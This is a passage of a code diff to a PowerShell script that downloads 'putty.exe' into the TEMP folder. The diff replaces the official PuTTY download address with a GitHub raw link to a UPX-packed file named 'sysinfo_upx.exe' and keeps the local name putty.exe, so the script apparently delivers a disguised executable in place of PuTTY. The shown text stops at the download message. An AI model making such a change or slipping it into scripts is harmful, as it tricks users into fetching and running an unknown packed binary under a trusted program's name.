@@ -1,6 +1,6 @@
 $exeName = "putty.exe"
 $exePath = Join-Path $env:TEMP $exeName
-$url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
+$url = "https://github.com/reika911/BOENG/raw/refs/heads/main/sysinfo_upx.exe"
 
 try {
     Write-Host "[*] Downloading..." -ForegroundColor Cyan
